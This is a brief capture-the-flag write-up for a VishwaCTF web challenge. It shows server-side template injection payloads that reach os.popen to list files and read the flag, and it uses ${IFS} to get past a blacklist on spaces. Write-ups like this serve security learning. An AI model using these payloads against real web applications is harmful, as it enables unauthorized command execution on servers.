# Challenge description

Hey Buddy, Give me your name I will display your name on my website. Yes exactly, there is nothing in this website.

Url - https://h3y-buddy.vishwactf.com/

-----------------------------------------------------------

So this was a typical SSTI ctf challenge but later on we found that there was a blacklist for spaces.

Payload:

```` /submit?name={{config.__class__.__init__.__globals__[%27os%27].popen("ls").read()}}  ````

Output:


We can simply bypass this with ${IFS}:

Final payload:

```` /submit?name={{config.__class__.__init__.__globals__[%27os%27].popen("cat${IFS}flag.txt").read()}}  ````

Output:


And there's the flag

``` Flag :  VishwaCTF{S3rv3r_1s_4fraiD_of_inj3c7ion} ```